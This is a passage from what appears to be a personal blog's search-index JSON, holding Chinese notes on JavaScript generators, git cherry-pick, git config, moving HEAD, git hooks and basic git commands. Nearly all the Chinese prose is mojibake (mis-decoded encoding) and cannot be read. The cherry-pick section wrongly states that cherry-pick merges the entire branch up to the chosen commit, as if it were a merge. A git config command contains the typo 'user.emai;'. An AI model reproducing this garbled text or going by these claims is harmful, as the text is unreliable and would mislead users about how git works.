getAuthor(post.authorId); console.log(author);}const iterable = getResult();iterable.next().value.then(posts =&gt; { iterable.next(posts).value.then(post =&gt; { iterable.next(post).value.then(author =&gt; { iterable.next(author); console.log('done') }) })}) é€™é‚Šåªè¦ç†è§£ä¸‹é¢é‚£ä¸€æ®µï¼Œå°±æœƒçŸ¥é“ç‚ºä»€éº¼å¯ä»¥é€™æ¨£å¯«äº†ï¼Œæ‰€ä»¥ä¾†ä¸€æ­¥ä¸€æ­¥çœ‹å§ï¼š iterable.next() é€™é‚Šæœƒè·‘åˆ°ç¬¬ä¸€å€‹ yield getPosts()ï¼Œæ‰€ä»¥å¯ä»¥ç”¨ .then æ‹¿åˆ°æ–‡ç« åˆ—è¡¨ã€‚ iterable.next(posts) è¨˜å¾—ä»¥å‰èªªçš„å—ï¼Ÿåœ¨ next è£¡é¢å‚³åƒæ•¸å°±ä»£è¡¨ã€ŒæŠŠä¸Šä¸€å€‹ yield çš„å€¼æ”¹å¯«æ‰ã€ï¼Œæ‰€ä»¥ const posts = responseã€‚ æ¥è‘—å› ç‚º posts æœ‰å€¼äº†ï¼Œæ‰€ä»¥ yield å¾Œé¢çš„ getPostInfo(posts[0].postId) å°±å¯ä»¥ç¹¼çºŒå¾€ä¸‹åŸ·è¡Œã€‚ iterable.next(post) è·Ÿå‰›å‰›ä¸€æ¨£ï¼ŒæŠŠ post å¯«åˆ°ä¸Šä¸€å€‹ yieldï¼Œæ‰€ä»¥ const post = responseï¼Œå¾Œé¢çš„ yield getAuthor(post.authorId) æ­£å¸¸è·‘ã€‚ iterable.next(author) é€™é‚Šä¹Ÿä¸€æ¨£ï¼ŒæœƒæŠŠ author çš„å¯«åˆ°ä¸Šä¸€å€‹ yieldï¼Œæ‰€ä»¥ const author = responseã€‚ æ¥è‘—å°±ç¹¼çºŒå¾€ä¸‹åŸ·è¡Œåˆ° console.log(author)ï¼Œé€™æ™‚å€™å› ç‚ºä¸Šä¸€è¡Œå·²ç¶“è³¦å€¼äº†ï¼Œæ‰€ä»¥å°±å¯ä»¥å°å‡ºæœ€å¾Œçš„çµæœã€‚ é€™ä¸€æ®µå¦‚æœçœ‹ä¸æ‡‚çš„è©±å°±é‡æ–°æ€è€ƒ next(params) çš„ä½œç”¨æ˜¯ä»€éº¼ï¼Ÿç„¶å¾Œä¸€æ­¥ä¸€æ­¥ç…§è‘—ç¨‹å¼ä¾†è·‘å°±æœƒç†è§£ä¸€äº›äº†ã€‚ ç¸½ä¹‹é€™é‚Šåªæ˜¯æƒ³ç¤ºç¯„ä¸€ä¸‹ç”¨ generator ä¾†å¯¦ä½œéåŒæ­¥æ˜¯ä»€éº¼æ¨£çš„æ„Ÿè¦ºã€‚ å†æ›´é€²éšä¸€é»å‰›å‰›çš„éƒ¨åˆ†å…¶å¯¦é‚„å¯ä»¥å†åšå€‹å„ªåŒ–ï¼Œç•¢ç«Ÿè¦ä¸€ç›´ç”¨ iterable.next çš„è©±åœ¨æŸç¨®æ„ç¾©ä¸Šä¹Ÿæœ‰é» callback hell çš„æ„Ÿè¦ºï¼Œæ‰€ä»¥å…¶å¯¦å¯ä»¥æ”¹å¯«æˆã€Œéè¿´ã€çš„å½¢å¼ï¼š 123456789101112131415161718function* getResult () { const posts = yield getPosts(); const post = yield getPostInfo(posts[0].postId); const author = yield getAuthor(post.authorId); console.log(author);}function run () { const iterable = getResult(); function go (result) { // åªè¦ done ä¸æ˜¯ true å°±ä¸€ç›´éè¿´ if (result.done) return result.value.then(res =&gt; go(iterable.next(res))) } go(iterable.next())}run(); é€™æ¨£å°±æœ‰ä¸€å€‹è‡ªå‹•åŒ–çš„ function ä¾†å¹«ä½ è·‘ generator äº†ï¼Œæ˜¯ä¸æ˜¯æœ‰ä¸€é» async/awiat çš„æ„Ÿè¦ºï¼Ÿä¹Ÿè¨±é€™èƒŒå¾Œå°±æ˜¯ç”¨é€™ç¨®æ–¹å¼ä¾†å¯¦ä½œçš„ä¹Ÿèªªä¸å®šã€‚ ç¸½ä¹‹ï¼Œä»¥ä¸Šå°±æ˜¯ generator çš„ç¤ºç¯„ï¼Œå¸Œæœ›æˆ‘èƒ½è¶Šä¾†è¶Šç†Ÿæ‚‰é€™ç©æ„å…’ã€‚","link":"/2022/05/19/generator-with-async/"},{"title":"Git bash ä¸Šçš„å¿«æ·éµ","text":"å°±åªæ˜¯å¿«æ·éµã€‚ ä½ ä»¥ç‚ºæ˜¯ Ctrl + C å’Œ Ctrl + V Ctrl + A + K åˆªé™¤æ•´è¡Œæ–‡å­— insert è²¼ä¸Šè¤‡è£½çš„å…§å®¹ Ctrl + insert è¤‡è£½é¸å–å…§å®¹ å…¶ä»– Ctrl + L æ¸…é™¤æ‰€æœ‰å…§å®¹","link":"/2021/12/13/git-bash-shortcut/"},{"title":"Git Cherry-pickï¼åªæŠŠæƒ³è¦çš„ commit ä½µé€²ä¾†","text":"å¾ˆç¥å¥‡çš„åŠŸèƒ½ã€‚ ç°¡è¿°å‡è¨­é€™æ˜¯ç›®å‰çš„ç´€éŒ„ï¼š æˆ‘ç¾åœ¨ä½æ–¼ master ä¸Šï¼Œç„¶å¾Œæœ‰ dog å’Œ cat é€™å…©å€‹åˆ†æ”¯ã€‚ç¾åœ¨æˆ‘æƒ³è¦æŠŠ cat çš„å…§å®¹åˆä½µåˆ° masterï¼Œå¯æ˜¯æˆ‘åªæƒ³è¦å…¶ä¸­å¹¾å€‹ commitï¼Œä¸æƒ³è¦å…¨éƒ¨éƒ½ä½µé€²å»ã€‚ ä¾‹å¦‚æˆ‘åªæƒ³è¦ add cat1 é€™ç­†ç´€éŒ„çš„è©±ï¼Œå¯ä»¥ä¸‹é€™æ®µæŒ‡ä»¤ï¼š 1git cherry-pick 1006eb2 é€™æ¨£ master å°±åªæœƒå¤šå‡º add cat1 çš„ç´€éŒ„ï¼š ä¸è¦å¹«æˆ‘ commitæœ‰æ™‚å€™ä½ å¯èƒ½æƒ³é¡å¤–åŠ ä¸€äº›æ±è¥¿ï¼Œæ‰€ä»¥ä¸å¸Œæœ›ä¸€ä¸‹å®ŒæŒ‡ä»¤å¾Œå°±ç›´æ¥ commit å‡ºå»ï¼Œé€™æ™‚å€™å¯ä»¥åŠ ä¸Š --no-commitï¼š 1git cherry-pick 1006eb2 --no-commit é€™æ¨£å­è³‡æ–™å°±æœƒè¢«æ”¾åˆ°ã€Œæš«å­˜å€ï¼ˆStage Areaï¼‰ã€ï¼Œç­‰åˆ°å…¨éƒ¨ä¿®æ”¹å®Œæˆå¾Œå†è‡ªå·± commit å°±è¡Œå›‰ã€‚ å° cherry-pick çš„èª¤è§£æˆ‘å‰›é–‹å§‹å­¸é€™å€‹æŒ‡ä»¤çš„æ™‚å¾Œç™¼ç¾æˆ‘å°å®ƒèƒŒå¾Œçš„å«ç¾©æœ‰ä¸€é»èª¤è§£ï¼Œæ‰€ä»¥ç‰¹åˆ¥å¯«é€™ä¸€æ®µä¾†è§£é‡‹ä¸€ä¸‹ã€‚ å…ˆå›æ†¶ä¸€ä¸‹å‰›å‰›çš„ç¯„ä¾‹ï¼š åœ¨å‰é¢çš„ç¤ºç¯„ä¸­æˆ‘å€‘æ˜¯å¾ cat ä¸­å–å‡º add cat1 çš„è¨˜éŒ„åˆ° master ä¸­ï¼Œä¸éå¦‚æœç¾åœ¨æ˜¯å–å‡º add cat3 å‘¢ï¼Ÿ 1git cherry-pick 63eeaa5 å‡ºä¾†çš„çµæœå°±æœƒè®Šé€™æ¨£å­ï¼š çœ‹èµ·ä¾†æ²’ä»€éº¼å•é¡Œå•Šï¼Ÿæ€éº¼äº†å—ï¼Ÿ å–®å¾æ­·å²ç´€éŒ„ä¾†çœ‹çš„è©±ç¢ºå¯¦æ˜¯æ²’æœ‰ä»€éº¼å•é¡Œï¼Œä½†å…¶å¯¦ cherry-pick ä¸¦ä¸æ˜¯å¹«ä½ æŠŠ add cat3 çµ¦æŠ“å‡ºä¾†ï¼Œè€Œæ˜¯æŠŠ add cat3 çµ¦åˆä½µã€‚ é€™æ¨£å­èªªå¯èƒ½è½ä¸æ‡‚ï¼Œæ‰€ä»¥æˆ‘å€‘ä¾†çœ‹ä¸€ä¸‹ add cat3 ä¿®æ”¹äº†ä»€éº¼ï¼š add cat3 åªæœ‰æ–°ä¸€è¡Œ Cat3 è€Œå·²ï¼Œæ¥è‘—ä¾†çœ‹ä¸€ä¸‹ä½µå®Œå¾Œçš„ masterï¼š æ³¨æ„åˆ°äº†å—ï¼Ÿæœ€å¾Œçš„å…§å®¹ä¸¦ä¸æ˜¯åªæœ‰ add cat3 ç•¶ä¸‹æ‰€åšçš„æ”¹è®Šï¼Œè€Œæ˜¯é€™å€‹ commit ç•¶ä¸‹çš„æ‰€æœ‰æª”æ¡ˆå…§å®¹ï¼Œæ›å¥è©±èªªå°±æ˜¯æ•´å€‹åˆä½µé€²ä¾†ã€‚ æ‰€ä»¥é€™å°±è·Ÿæˆ‘åŸæœ¬æƒ³çš„ä¸å¤ªä¸€æ¨£ï¼Œæˆ‘ä»¥ç‚ºå®ƒåªæœƒæŠŠã€Œä¿®æ”¹çš„å…§å®¹ã€çµ¦æŠ“å‡ºä¾†è€Œå·²ï¼Œä½†å¯¦éš›ä¸Šçš„æ„æ€æ˜¯ï¼š é¸æ“‡æˆ‘æƒ³è¦ merge çš„ä½ç½®ï¼Œä¸¦ä¸”ç•™ä¸‹é€™å€‹ä½ç½®çš„ commit è¨Šæ¯ã€‚ æˆ‘èˆ‰å¹¾å€‹ä¾‹å­ï¼ˆé€™é‚Šç‚ºäº†æ–¹ä¾¿é–±è®€å°±ä¸å¯« hash å€¼äº†ï¼‰ï¼š 1git cherry-pick 'add cat1' æ„æ€æ˜¯ã€ŒæŠŠ add cat1 åˆä½µåˆ° masterï¼Œä½†åªç•™ä¸‹ add cat1 çš„æäº¤ç´€éŒ„ã€ 1git cherry-pick 'add cat2' æ„æ€æ˜¯ã€ŒæŠŠ add cat2 åˆä½µåˆ° masterï¼Œä½†åªç•™ä¸‹ add cat2 çš„æäº¤ç´€éŒ„ã€ 1git cherry-pick 'add cat3' æ„æ€æ˜¯ã€ŒæŠŠ add cat3 åˆä½µåˆ° masterï¼Œä½†åªç•™ä¸‹ add cat3 çš„æäº¤ç´€éŒ„ã€ ä½ å¯ä»¥æŠŠä¸Šé¢é€™å¹¾å€‹ç¯„ä¾‹æƒ³æˆé€™æ¨£ï¼š 123git merge 'add cat1' // åˆä½µï¼Œä½†åªä¿ç•™ add cat1 çš„ commit ç´€éŒ„git merge 'add cat2' // åˆä½µï¼Œä½†åªä¿ç•™ add cat2 çš„ commit ç´€éŒ„git merge 'add cat3' // åˆä½µï¼Œä½†åªä¿ç•™ add cat3 çš„ commit ç´€éŒ„ ç¸½ä¹‹ä½ ä¸€å®šè¦è¨˜å¾—ï¼š cherry-pick åªæ˜¯ç”¨å¦ä¸€ç¨®æ–¹å¼ä¾†åš merge cherry-pick åªæ˜¯ç”¨å¦ä¸€ç¨®æ–¹å¼ä¾†åš merge cherry-pick åªæ˜¯ç”¨å¦ä¸€ç¨®æ–¹å¼ä¾†åš merge ä¸ç®¡ä½ é¸æ“‡çš„ä½ç½®æ˜¯å“ªè£¡ï¼Œåªè¦æƒ³æˆä½ æ˜¯åœ¨åš merge å°±å¥½äº†ï¼Œè·Ÿé‚£å€‹ commit ä¿®æ”¹çš„å…§å®¹ä¸€é»é—œä¿‚ä¹Ÿæ²’æœ‰ã€‚ é‚£ä»€éº¼æ™‚å€™è©²ç”¨ cherry-pickï¼Ÿå¦‚æœæœ‰è½æ‡‚å‰›å‰›çš„è§£é‡‹ï¼Œå°±èƒ½ç†è§£ cherry-pick æ¯”è¼ƒåƒæ˜¯ã€Œå¯ä»¥è‡ªç”±é¸æ“‡ commit ç´€éŒ„çš„ mergeã€ï¼Œè€Œä¸æ˜¯æŠŠä½ æƒ³è¦çš„ä¿®æ”¹å…§å®¹æŠ½å‡ºä¾†ï¼Œæ‰€ä»¥æ¯”è¼ƒæ­£ç¢ºçš„ç”¨æ³•å¤§æ¦‚æœƒæ˜¯åƒé€™æ¨£ï¼Œä¸€æ¨£æ˜¯å‰›å‰›çš„ä¾‹å­ï¼š 1git cherry-pick 63eeaa5 -x é€™é‚ŠæŠŠ add cat3 åˆä½µé€²ä¾†ä¸¦åŠ ä¸Š -xï¼Œ-x æ˜¯ç”¨ä¾†è®“ Git è‡ªå‹•å¹«æˆ‘å€‘ç”¢ç”Ÿã€Œæ¨™æº–è¨Šæ¯ã€ã€‚ é™„è¨»ï¼šå› ç‚º cherry-pick ä½µå®Œå¾Œä¸æœƒé¡å¤–ç”¢ç”Ÿæ–°çš„ commitï¼Œæ‰€ä»¥ä¸ä»”ç´°çœ‹çš„è©±å¯èƒ½ä¸æœƒçŸ¥é“é€™ä»½ç´€éŒ„æ˜¯ä½µéä¾†çš„ï¼Œæ‰€ä»¥æ‰å»ºè­°åœ¨ commit å…§å®¹ä¸­åŠ ä¸Šé¡å¤–çš„è¨Šæ¯ã€‚ æœ€å¾Œå®Œæˆçš„çµæœå°±æœƒåƒé€™æ¨£ï¼š å°±è·Ÿå‰›å‰›èªªçš„ä¸€æ¨£ï¼Œé€™è£¡å¯¦éš›ä¸Šæ˜¯å¹«ä½ åˆä½µæ‰€æœ‰åœ¨ cat ä¸­çš„æ‰€æœ‰ä¿®æ”¹ï¼Œä½†åªæœ‰ä¿ç•™ add cat3 çš„ commit ç´€éŒ„ã€‚é †é“ä¸€æé€™æ®µ commit è¨Šæ¯æ‡‰è©²è¦ä¿®æ”¹æˆ add cat1 ~ 3 æ‰æ¯”è¼ƒç¬¦åˆé€™å€‹ commit å¯¦éš›ä¸Šåšçš„äº‹æƒ…ï¼Œä½†é€™é‚Šåªæ˜¯ç‚ºäº†ç¤ºç¯„æ‰€ä»¥å°±æ²’ç‰¹åˆ¥åšäº†ã€‚ ç¸½ä¹‹ç”¨ cherry-pick å…¶å¯¦åªæ˜¯ä»¤å¤–ä¸€ç¨®åˆä½µæ–¹å¼è€Œå·²ï¼Œå®ƒå¯ä»¥è®“ä½ å¾ˆè¼•é¬†çš„æ‹¿æ‰ä¸å¿…è¦çš„ commit ç´€éŒ„ã€‚ å¦‚æœè¦ç”¨ merge ä¾†ç”¢å‡ºç›¸åŒçš„çµæœï¼Œæ­¥é©Ÿå°±æœƒè®Šæ¯”è¼ƒéº»ç…©ï¼š 1git merge 63eeaa5 1git reset HEAD~3 // å–æ¶ˆæœ€å¾Œ 3 ç­† commit ç´€éŒ„ï¼ˆä½†ä¿ç•™æª”æ¡ˆï¼‰ 1git commit -am 'add cat3' // åŠ å…¥æš«å­˜å€ä¸¦æäº¤ æ‰€ä»¥å…©ç¨®æ–¹æ³•å…¶å¯¦éƒ½è¡Œï¼Œç«¯çœ‹ä½ å–œæ­¡å“ªä¸€ç¨®è€Œå·²ã€‚","link":"/2022/10/14/git-cherry-pick/"},{"title":"Git è¨­å®šå€‹äººè³‡è¨Š","text":"ç¬¬ä¸€æ¬¡ç¢°åˆ°é€™å•é¡Œã€‚ ç°¡è¿°é€²äº†å…¬å¸å¾Œæˆ‘æ‰ç¢°åˆ°é€™å€‹å•é¡Œï¼Œå°±æ˜¯å…¬å¸çš„å°ˆæ¡ˆåœ¨ä½¿ç”¨ git æ™‚é€šå¸¸æœƒè¨­å®šå…¬å¸çš„ä¿¡ç®±åŠåç¨±ï¼Œå¯æ˜¯æœ‰æ™‚æœƒå¸Œæœ›è‡ªå·±çš„å°ˆæ¡ˆä¸Šå¯ä»¥ç”¨å€‹äººçš„è¨­å®šï¼Œé€™æ™‚å€™å°±å¯ä»¥ç”¨ä¸‹é¢çš„æ–¹æ³•ä¾†èª¿ã€‚ é‚„è »ç°¡å–®çš„ï¼Œåªè¦é€²å…¥åˆ°è‡ªå·±çš„å°ˆæ¡ˆç›®éŒ„åº•ä¸‹ç›´æ¥è¨­å®šï¼š 12git config user.name \"your name\"git config user.emai; \"your email\" é€™æ¨£å°±æœƒå°å°ˆæ¡ˆåº•ä¸‹çš„ .git æ–°å¢ç›¸é—œçš„ configï¼Œåªè¦åœ¨é€™å€‹å°ˆæ¡ˆçš„ç¯„åœéƒ½æœƒä»¥é€™é‚Šçš„ config ç‚ºä¸»ã€‚ é †é“ä¸€æï¼Œå¦‚æœè¦ä¿®æ”¹å…¨åŸŸè¨­å®šçš„è©±ï¼Œå¯ä»¥é€™æ¨£åšï¼š 12git config --global user.name \"your name\"git config --global user.emai; \"your email\"","link":"/2022/05/11/git-config-setting/"},{"title":"Gitï¼HEAD","text":"ä¸ç¢ºå®šä»€éº¼æ™‚å€™æœƒç”¨åˆ°ï¼Œä½†è¨˜ä¸‹ä¾†å°±å°äº†ã€‚ çµ•å°ä½ç½®æˆ‘å€‘é™¤äº†åœ¨ä¸åŒåˆ†æ”¯ä¸Šå·¥ä½œä»¥å¤–ï¼Œæœ‰æ™‚å€™ä¹Ÿæœƒéœ€è¦åˆ‡æ›åˆ°ã€ŒæŒ‡å®šçš„ commitã€ï¼ˆä¾‹å¦‚è¦åš rollback çš„æ™‚å€™ï¼‰ï¼Œé€™å€‹æ™‚å€™å¯èƒ½å°±æœƒéœ€è¦ã€Œåˆ‡æ› HEADã€çš„ä½ç½®ã€‚ å‡è¨­ç›®å‰çš„ç´€éŒ„é•·é€™æ¨£ï¼š åœ¨æˆ‘å€‘æ²’æœ‰å»åˆ»æ„ç§»å‹• HEAD çš„æƒ…æ³ä¸‹ï¼Œå®ƒé€šå¸¸æœƒæŒ‡å‘ç›®å‰çš„æ‰€åœ¨åˆ†æ”¯ï¼ˆmainï¼‰ ç¾åœ¨æˆ‘å€‘å¯ä»¥ç”¨ä¸‹é¢çš„æŒ‡ä»¤ä¾†æŠŠ HEAD ç§»å‹•åˆ° C1 é€™å€‹ã€Œcommitã€ä¸Šï¼š 1git checkout C1 åŸ·è¡Œå®Œçš„çµæœå¦‚ä¸‹ï¼š é›–ç„¶ä½ç½®çœ‹èµ·ä¾†æ˜¯ä¸€æ¨£çš„ï¼Œä¸éå·®åˆ¥åœ¨æ–¼ä¸€å€‹æŒ‡å‘çš„æ˜¯ã€Œåˆ†æ”¯ã€ï¼Œ ä¸€å€‹å‰‡æ˜¯ã€ŒCommitã€ã€‚ é€™ç¨®é€é Hash å€¼ä¾†ç§»å‹•çš„æ–¹å¼æ˜¯ã€Œçµ•å°ä½ç½®ã€ï¼Œç­‰ä¸€ä¸‹æœƒä»‹ç´¹æ€éº¼ç”¨ã€Œç›¸å°ä½ç½®ã€çš„æ–¹å¼ä¾†åšç§»å‹•ã€‚ ç›¸å°ä½ç½®é™¤äº†ç›´æ¥æŒ‡å®š Hash å€¼ä»¥å¤–ï¼Œæˆ‘å€‘ä¹Ÿå¯ä»¥åˆ©ç”¨ HEAD^ æˆ– HEAD~&lt;num&gt; çš„æ–¹å¼ä¾†æ ¹æ“šç›®å‰çš„ä½ç½®ä¾†ç§»å‹• HEADã€‚ ä¾‹å¦‚èªªåº•ä¸‹çš„é€™ç­†ç´€éŒ„ï¼š ç›®å‰æˆ‘å€‘ä½æ–¼ main åˆ†æ”¯ä¸Šï¼Œç¾åœ¨å¦‚æœæƒ³æŠŠ HEAD ç§»å‹•åˆ° C0 çš„ä½ç½®ï¼Œå¯ä»¥ç”¨å…©ç¨®ä¸åŒæ–¹å¼ä¾†é”æˆã€‚ ç¬¬ä¸€ç¨®ï¼š 12git checkout HEAD^ // ç§»å‹•åˆ° C1git checkout HEAD^ // ç§»å‹•åˆ° C0 ç¬¬äºŒç¨®ï¼š 1git checkout HEAD~2 æˆ‘è¦ºå¾—é€™é‚Šæ¯”è¼ƒé‡è¦çš„æ˜¯ã€Œç›¸å°ä½ç½®ã€çš„æ¦‚å¿µï¼Œä¸è«–ä½ æ˜¯å–œæ­¡ç”¨ HEAD^ é‚„æ˜¯ HEAD~ï¼Œå®ƒå€‘éƒ½ä¸€å®šæ˜¯åŸºæ–¼æŸä¸€é»ä¾†åšç§»å‹•ï¼Œé€™æ‰æ˜¯æ¯”è¼ƒæ ¸å¿ƒçš„æ¦‚å¿µã€‚ çµ•å°ä½ç½® + ç›¸å°ä½ç½®åˆåœ¨ä¸€èµ·ä½¿ç”¨çµ•å°è·Ÿç›¸å°å…¶å¯¦æ˜¯å¯ä»¥ä¸€èµ·ä½¿ç”¨çš„ï¼Œç›´æ¥ä¾†çœ‹ç¯„ä¾‹æœƒæ¯”è¼ƒå¥½ç†è§£ä¸€é»ã€‚ å‡è¨­é€™æ˜¯ç›®å‰çš„ç´€éŒ„ï¼š HEAD ç¾åœ¨ä½æ–¼ main åˆ†æ”¯ä¸Šï¼Œå¦‚æœæˆ‘æƒ³è¦ç§»å‹•åˆ° C3 çš„ä½ç½®çš„è©±å¯ä»¥æ€éº¼åšï¼Ÿ å¦‚æœæ˜¯ç”¨çµ•å°ä½ç½®çš„æ–¹å¼çš„è©±ï¼š 1git checkout C3 æˆ–è€…æ˜¯ç›¸å°ä½ç½®çš„è©±ï¼š 12git checkout bugFix // å…ˆåˆ‡æ›åˆ†æ”¯git checkout HEAD^ // å¾€å‰ä¸€å‹•ä¸€å€‹ commit æˆ–æ˜¯ä¹¾è„†ä¸€é»ï¼Œç›´æ¥æ··å†ä¸€èµ·ç”¨ï¼š 1git checkout bugFix^ // åˆ‡æ›åˆ° bugFix çš„å‰ä¸€å€‹ commit ç¸½è€Œè¨€ä¹‹åˆ‡æ› HEAD çš„æ–¹å¼æœ‰å¾ˆå¤šç¨®ï¼Œé€™é‚Šåªæ˜¯æƒ³æé†’ä¸€ä¸‹æ··ç”¨çš„åŠŸèƒ½ï¼Œæˆ‘è¦ºå¾—é€™é‚„è »æ–°å¥‡çš„ã€‚ ç§»å‹•åˆ†æ”¯çš„ commit ä½ç½®é€™å€‹æˆ‘ç›®å‰é‚„ä¸ç¢ºå®šå®ƒçš„å¯¦éš›ç”¨é€”ï¼Œä¸éç¬¬ä¸€æ¬¡çŸ¥é“æœ‰é€™å€‹åŠŸèƒ½æ‰€ä»¥å°±é †ä¾¿è¨˜éŒ„ä¸€ä¸‹å§ã€‚ ç°¡å–®ä¾†èªªé™¤äº†ç§»å‹• HEAD ä»¥å¤–ï¼Œæˆ‘å€‘é‚„å¯ä»¥ç›´æ¥æŠŠåˆ†æ”¯ç§»å‹•åˆ°æŸä¸€å€‹ commit ä¸Šï¼Œé€™æ¨£å­èªªæœ‰é»æŠ½è±¡ï¼Œæ‰€ä»¥ä¸€æ¨£ä¾†çœ‹åœ–å§ã€‚ å‡è¨­é€™æ˜¯ç›®å‰çš„ç´€éŒ„ï¼š å¦‚æœæˆ‘æƒ³è¦ç§»å‹• bugFix é€™æ•´å€‹åˆ†æ”¯çš„ä½ç½®çš„è©±ï¼Œæˆ‘å¯ä»¥é€™æ¨£åšï¼š 1git branch -f bugFix C3 é™„è¨»ï¼šé€™é‚Šçš„æŒ‡ä»¤æ˜¯ git branch -f &lt;åˆ†æ”¯åç¨±&gt; &lt;è¦ç§»å‹•åˆ°çš„ä½ç½®&gt; åŸ·è¡Œå®Œçš„çµæœå¦‚ä¸‹ï¼š é€™æ¨£å­å°±å¯ä»¥æŠŠ bugFix å¾åŸæœ¬çš„ C5 ç§»å‹•åˆ° C3 çš„ä½ç½®äº†ã€‚","link":"/2022/10/04/git-head/"},{"title":"Git hook","text":"å¥½åƒèµ°åˆ°å“ªè£¡ï¼Œæ™ƒåˆ°å“ªè£¡ï¼Œéƒ½æœ‰ hook é€™å€‹æ±è¥¿ã€‚ é—œæ–¼ hookhook çš„ç›´ç¿»æ˜¯ã€Œé‰¤å­ã€ã€‚ä½†åœ¨ç¨‹å¼çš„ä¸–ç•Œè£¡ï¼Œä½ å¯ä»¥æŠŠå®ƒæƒ³åƒæˆæ˜¯é‡£é­šçš„é‚£å€‹é‰¤å­ï¼Œç•¶æœ‰é­šä¸Šé‰¤çš„æ™‚å€™ï¼Œé‰¤å­å°±æœƒæœ‰ã€Œåæ‡‰ã€ã€‚ é€™å€‹åæ‡‰å°±æ˜¯ç”¨ä¾†é€šçŸ¥æˆ‘å€‘ã€ŒæŸä»¶äº‹æƒ…ç™¼ç”Ÿäº†ã€çš„æ„æ€ã€‚ ä»¥ Git ä¾†èªªçš„è©±ï¼Œå¯ä»¥æ˜¯ï¼š æœ‰äºº commit çš„æ™‚å€™é€šçŸ¥æˆ‘ æœ‰äºº push çš„æ™‚å€™é€šçŸ¥æˆ‘ Git ä¸­çš„ hooké€™äº› hook éƒ½æ”¾åœ¨ .git è£¡é¢çš„ hooks è³‡æ–™å¤¾ã€‚ æ¯å€‹ hook éƒ½æœƒåœ¨ç‰¹å®šçš„æ™‚æ©Ÿè¢«è§¸ç™¼ï¼Œä¾‹å¦‚èªªã€Œpre-commitã€é€™å€‹ hook æœƒåœ¨ã€Œcommit ä¹‹å‰è¢«è§¸ç™¼ã€ã€‚ ä½ å¯ä»¥åˆ©ç”¨é€™å€‹ hook ä¾†å¯«ä¸€æ®µ shell scriptï¼ˆç•¶æˆæ˜¯ä¸€ç¨®å¯«å¥½çš„è…³æœ¬å°±å¥½ï¼‰åšæ§åˆ¶ï¼Œè®“åªæœ‰é€šéæª¢æŸ¥çš„ commit æ‰æœƒçœŸçš„é€å‡ºå»ã€‚ exit 0ï¼Œä»£è¡¨æˆåŠŸï¼ŒæœƒåŸ·è¡Œ exit 1ï¼Œä»£è¡¨å¤±æ•—ï¼Œä¸æœƒåŸ·è¡Œ å¦‚æœä½ å­¸é C èªè¨€ï¼Œä½ å¯ä»¥ç”¨ C èªè¨€æœƒç”¨ ã€Œreturn 0ã€ä¾†ä»£è¡¨åŸ·è¡Œæ­£ç¢ºçš„æ¦‚å¿µä¾†å¹«åŠ©è¨˜æ†¶ã€‚ ï¼ˆæˆ‘ç›®å‰é‚„ä¸æœƒå¯« shell scriptï¼Œä½†ç¾åœ¨åªè¦çŸ¥é“ Git æœ‰ hook é€™å€‹æ±è¥¿å¯ä»¥ç”¨å°±å¥½äº†ï¼Œä»¥å¾Œæœ‰éœ€è¦çš„æ™‚å€™è‡ªç„¶å°±æœƒå»æŸ¥è³‡æ–™äº†ã€‚ï¼‰ åƒè€ƒè³‡æ–™ä½¿ç”¨ Git Hooks ç´€éŒ„ä¸åŒå°ˆæ¡ˆçš„ commit è¨Šæ¯","link":"/2021/12/13/git-hook/"},{"title":"Git æŒ‡ä»¤","text":"æŠŠä¸€äº›æœƒç”¨åˆ°çš„æŒ‡ä»¤éƒ½ç´€éŒ„åœ¨é€™è£¡ã€‚ å¹«åŠ©ä½ ç†è§£çš„å°æç¤ºGit æŠŠæª”æ¡ˆåˆ†æˆå…©ç¨®ï¼š Untracked ä¸åŠ å…¥ç‰ˆæœ¬æ§åˆ¶ï¼ˆå¯æƒ³æˆæ˜¯ä»£è¡¨ã€Œæª”æ¡ˆé‚„æ²’è¢«æ”¾åˆ°è³‡æ–™å¤¾ã€è£¡é¢ï¼‰ Staged åŠ å…¥ç‰ˆæœ¬æ§åˆ¶ï¼ˆå¯æƒ³æˆæ˜¯ä»£è¡¨ã€Œæª”æ¡ˆå·²ç¶“æ”¾åˆ°è³‡æ–™å¤¾ã€è£¡é¢äº†ï¼‰ è¨­å®šç¸®å¯«123git config --global alias.co checkoutgit config --global alias.br branchgit config --global alias.st status å¦‚æœæƒ³åˆªé™¤çš„è©±å¯ä»¥åˆ° ~/.gitconfig ä¸­åšä¿®æ”¹ã€‚ åŸºæœ¬æŒ‡ä»¤git initï¼Œåˆå§‹åŒ–ã€‚åˆå§‹åŒ–å¾Œ Git å°±æœƒçŸ¥é“æˆ‘å€‘è¦å°é€™å€‹å°ˆæ¡ˆåšç‰ˆæœ¬æ§åˆ¶ .gitignore ï¼Œè¦å¿½ç•¥çš„æª”æ¡ˆï¼ˆä¸è¦åŠ å…¥ç‰ˆæ§çš„æª”æ¡ˆï¼‰ã€‚å®ƒè‡ªå·±ä¹Ÿæ‡‰è©²è¦åŠ åˆ°ç‰ˆæ§è£¡é¢ï¼Œé€™æ¨£åˆ¥äººæ‰çŸ¥é“æœ‰å“ªäº›æª”æ¡ˆè¢«å¿½ç•¥ã€‚ git statusï¼ŒæŸ¥çœ‹ç›®å‰çš„ç‹€æ…‹ git addï¼ŒæŠŠæª”æ¡ˆåŠ å…¥ç‰ˆæœ¬æ§åˆ¶ï¼ˆæ¯ä¸€æ¬¡éƒ½è¦åšçš„å‹•ä½œã€‚å¯æƒ³æˆæ˜¯æŠŠæª”æ¡ˆæ”¾åˆ° temp è³‡æ–™å¤¾ï¼‰git add .ï¼ŒæŠŠç›®å‰è³‡æ–™å¤¾åº•ä¸‹æ‰€æœ‰æª”æ¡ˆéƒ½åŠ å…¥ç‰ˆæœ¬æ§åˆ¶ git rm --cachedï¼Œæˆ‘ç¾åœ¨åˆä¸æƒ³è¦å° xx æª”æ¡ˆåšç‰ˆæœ¬æ§åˆ¶ï¼ˆå¾ Staged è®Šæˆ Untrackedï¼‰ git commitï¼Œæ–°å»ºä¸€å€‹ç‰ˆæœ¬ï¼ˆå¯æƒ³æˆæ˜¯ã€Œç”¨äº‚æ•¸å¹«è³‡æ–™å¤¾å‘½åã€çš„å‹•ä½œï¼Œä»£è¡¨é€™å€‹ç‰ˆæœ¬å»ºç«‹å®Œæˆã€‚ï¼‰git commit -amï¼Œä¸€å€‹å¿«é€Ÿæäº¤çš„æ–¹æ³•ã€‚å¯ä»¥åŒæ™‚åŸ·è¡ŒåŠ 